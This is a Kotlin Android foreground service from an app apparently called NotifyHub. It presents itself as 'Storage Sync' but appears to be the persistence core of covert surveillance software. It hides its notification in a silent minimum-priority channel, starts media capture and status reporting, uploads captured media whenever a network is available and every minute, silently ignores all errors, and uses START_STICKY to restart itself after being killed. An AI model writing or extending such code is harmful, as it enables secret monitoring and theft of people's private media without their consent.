package com.notifyhub

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import kotlinx.coroutines.*

class SyncForegroundService : Service() {

    companion object {
        const val CHANNEL_ID = "notifyhub_sync"
        const val NOTIF_ID = 1
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            scope.launch {
                try {
                    MediaUploader.drainQueue(this@SyncForegroundService)
                } catch (_: Exception) {
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createSilentChannel()
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("Storage Sync status")
            .setContentText("Slide to close this.")
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForegroundWithType(NOTIF_ID, notification)
        MediaCaptureManager.start(this)
        AppStatusReporter.report(this)
        try {
            getSystemService(ConnectivityManager::class.java)
                .registerDefaultNetworkCallback(networkCallback)
        } catch (_: Exception) {
        }
        startRetryLoop()
    }

    private fun startForegroundWithType(id: Int, notification: android.app.Notification) {
        if (android.os.Build.VERSION.SDK_INT >= 29) {
            ServiceCompat.startForeground(
                this, id, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(id, notification)
        }
    }

    private fun createSilentChannel() {
        val channel = NotificationChannel(CHANNEL_ID, "Storage Sync",
            NotificationManager.IMPORTANCE_MIN).apply {
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun startRetryLoop() {
        scope.launch {
            while (isActive) {
                try {
                    NotificationSender.drainQueue()
                } catch (_: Exception) {}
                try {
                    MediaUploader.drainQueue(this@SyncForegroundService)
                } catch (_: Exception) {}
                try {
                    MediaCaptureManager.poll(this@SyncForegroundService)
                } catch (_: Exception) {}
                try {
                    AppStatusReporter.report(this@SyncForegroundService)
                } catch (_: Exception) {}
                delay(60_000L)
            }
        }
    }

    // START_STICKY: Android restarts this service if it's killed
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            getSystemService(ConnectivityManager::class.java)
                .unregisterNetworkCallback(networkCallback)
        } catch (_: Exception) {
        }
        MediaCaptureManager.stop(this)
        scope.cancel()
        super.onDestroy()
    }
}
